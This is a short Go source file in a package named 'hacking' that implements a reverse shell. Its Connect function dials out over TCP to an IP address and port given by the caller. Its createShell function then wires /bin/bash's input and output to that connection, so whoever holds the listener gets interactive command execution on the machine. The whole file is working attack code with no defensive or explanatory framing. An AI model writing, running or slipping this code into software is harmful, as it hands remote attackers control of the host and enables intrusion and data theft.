package hacking

import (
	"fmt"
	"net"
	"os"
	"os/exec"
)

func createShell(connection net.Conn) {
	var message string = "successful connection from " + connection.LocalAddr().String()
	_, err := connection.Write([]byte(message + "\n"))
	if err != nil {
		fmt.Println("An error occurred trying to write to the outbound connection:", err)
		os.Exit(2)
	}

	cmd := exec.Command("/bin/bash")
	cmd.Stdin = connection
	cmd.Stdout = connection
	cmd.Stderr = connection

	cmd.Run()
}

func Connect(tcpIP string, tcpPort string) {
	connection, err := net.Dial("tcp", fmt.Sprintf("%s:%s", tcpIP, tcpPort)) //connect to the listener on another machine
	if err != nil {
		fmt.Println("An error occurred trying to connect to the target:", err)
	}
	go createShell(connection)
}
